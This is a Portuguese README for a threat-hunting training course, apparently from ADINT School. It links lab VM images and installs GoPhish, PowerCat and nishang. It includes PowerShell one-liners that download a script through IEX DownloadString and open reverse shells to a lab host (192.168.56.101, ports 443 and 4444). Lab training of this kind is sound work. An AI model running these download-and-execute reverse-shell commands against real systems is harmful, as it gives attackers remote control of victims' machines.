# THA-ADINT
Repositório de links para o Treinamento Threat Hunting Analist da ADINT School

## Módulo 00

## Download do Virtual Box, Extension Pack, Kali Linux, Metasploitable e ISOS(Windows e Ubuntu)

### VirtualBox Package and Virtual Box Extension Pack
https://www.virtualbox.org/wiki/Downloads

### Kali Download: 
https://www.kali.org/get-kali/#kali-virtual-machines

### Metasploitable:
https://drive.google.com/file/d/1QQwcYOcoKg4zAUEB0xS5urE53H4xWgv_/view?usp=drive_link

### Windows 10:
https://drive.google.com/file/d/12xLX9p-XiLgWqn1eLAse1OUe8QsqScqQ/view?usp=drive_link

### Ubuntu Server: 
https://ubuntu.com/download/server

## Kali Linux
### Atualização
```
$ sudo su
# apt update
# apt upgrade -y
```
### GoPhish
https://github.com/gophish/gophish
```
$ sudo mkdir /opt/git
$ sudo chown -R kali:kali /opt/git/
$ cd /opt/git
$ git clone https://github.com/gophish/gophish.git
$ cd gophish
$ ls -l
$ sudo apt install golang -y
$ go build
```
### PowerCat
https://github.com/besimorhino/powercat
```
$ mkdir ~/THA/
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1

IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.56.101/powercat.ps1'); powercat -c 192.168.56.101 -p 443 -e cmd
```
### Invoke-PowerShellTCP
https://github.com/samratashok/nishang
```
$ cd ~/THA/
$ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -Port 4444
powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')
```

## Windows 10

### Office 2013
https://drive.google.com/file/d/11wmov4jpwOzQ2A0Rq0osQ4-YjdfsLTEV/view?usp=drive_link

